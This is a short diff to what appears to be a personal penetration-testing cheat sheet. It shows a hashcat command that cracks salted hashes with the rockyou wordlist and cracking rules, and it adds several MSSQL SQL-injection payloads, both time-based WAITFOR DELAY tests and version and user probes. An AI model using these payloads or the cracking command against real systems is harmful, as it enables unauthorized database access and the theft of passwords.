@@ -18,3 +18,14 @@ hashcat with rule:
 https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule
 
 └─$ hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule 
+
+
+MSSQL inj:
+  1' IF (1=1) WAITFOR DELAY '0:0:05'-- -
+  1'WAITFOR DELAY '0:0:05'-- -
+  'IF (1=1) -- -
+  
+  
+  ’;SELECT @@version--
+  'SELECT @@version;--
+  'select user;--
